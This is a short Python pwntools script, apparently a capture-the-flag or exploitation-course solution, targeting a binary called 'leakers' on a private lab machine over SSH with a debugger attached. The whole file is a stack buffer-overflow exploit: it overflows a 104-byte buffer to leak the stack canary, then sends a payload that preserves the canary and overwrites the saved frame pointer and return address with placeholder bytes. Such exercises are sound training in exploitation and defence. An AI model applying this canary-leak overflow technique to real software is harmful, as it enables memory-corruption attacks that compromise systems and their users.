from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
ssh = ssh("jinblack", "192.168.56.102")
r = ssh.process("./leakers")
gdb.attach(r,'''
    b *0x00401255
''')
context.log_level = "debug"

raw_input("wait")

r.send("A")
time.sleep(0.1)

r.send("B"*104 + "C")
time.sleep(0.1)
r.recvuntil("C")
canary = u64("\x00"+ r.recv(7))
print "canary is %#x" % canary
payload = "B"*104 + p64(canary) + "D"* 8 + "E"*8

r.send(payload)
time.sleep(0.1)

r.send("\x00")
r.interactive()
